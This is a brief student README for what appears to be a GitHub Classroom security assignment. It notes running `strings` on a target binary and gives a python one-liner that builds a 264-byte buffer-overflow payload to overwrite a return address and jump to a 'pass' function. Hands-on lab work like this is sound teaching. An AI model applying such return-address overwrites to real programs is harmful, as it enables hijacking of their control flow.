[![Review Assignment Due Date](https://classroom.github.com/assets/deadline-readme-button-22041afd0340ce965d47ae6ef1cefeee28c7c493a6346c4f15d667ab976d596c.svg)](https://classroom.github.com/a/d5nOy1eX)



Vardaan Goel - 2025117001

q3 a) used cmd strings target_vardaangoel | grep -C 5 "passed"


b)found exact buffer size (256). + frame pointer(8)=264
So return address after 264. Uploaded 264 random characters then address of the pass function.

python3 -c "import sys; sys.stdout.buffer.write(b'1'*264+b'\xe8\x04\x01\x00\x00\x00\x00\x00')" > payload

